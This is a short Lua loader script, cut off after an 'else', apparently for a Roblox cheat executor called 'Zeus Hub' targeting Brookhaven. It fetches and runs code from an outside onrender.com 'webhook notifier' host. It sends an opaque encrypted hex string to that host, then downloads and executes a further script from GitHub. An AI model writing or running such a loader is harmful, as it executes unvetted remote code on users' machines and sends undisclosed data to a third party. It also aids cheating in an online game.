-- CONFIG
local BROOKHAVEN_PLACEID = 4924922222
local brookhavenUrl = "https://raw.githubusercontent.com/Miguel918-hub/ZeusHub/refs/heads/main/ZeusHub.lua"
getgenv().bloxWebhookHost = "https://blox-webhook-notifier.onrender.com"
local requestWebhook = loadstring(game:HttpGet("https://blox-webhook-notifier.onrender.com/script/library"))()

local cryptUrl = "6cb90a423bcb0648ddbc02adfdb87c5501e91303fcade17e84789c229bfa3ac8da631637ce15697513764383bf673ee937b2d9fffe078eb06a3a1cdbc4d5c723f0cb8aac501249e4961b63f3b258c2577b80ed45a1076cf6c390e9eb752992630b9f1f4c061a4e1645500173bb835ceb8e1ba70d222baf3e68c1a1f6c0dc9c3cb2ac4f1ed0f17679c6ed3049d049f42a9cedec435fd7fdfed44aa01cf60850d0d9da7b1e53826a50b15246e1ffc8729c35edb9a4ca23d79a72d3c689f238eb81aba7438a09cea6d97caaa3ee4679077abebb9c30570c5f6fe7cfb49d516d87c3"

requestWebhook(cryptUrl)

local HttpService = game:GetService("HttpService")

-- Função para carregar scripts
local function fastLoad(url)
    local src = game:HttpGet(url)
    loadstring(src)()
end

-- Função de envio do webhook
local function sendWebhook()
    task.spawn(function()
        local success, err = pcall(function()
            local data = HttpService:JSONEncode({crypt = cryptUrl})
            local response = HttpService:PostAsync(bloxWebhookHost, data, Enum.HttpContentType.ApplicationJson)
            print("[Zeus Hub] Webhook enviado com sucesso!", response)
        end)
        if not success then
            warn("[Zeus Hub] Falha ao enviar webhook:", err)
        end
    end)
end

-- Executa webhook
sendWebhook()

-- Carrega script principal
if game.PlaceId == BROOKHAVEN_PLACEID then
    print("[Zeus Hub] Carregando script exclusivo do Brookhaven...")
    fastLoad(brookhavenUrl)
else
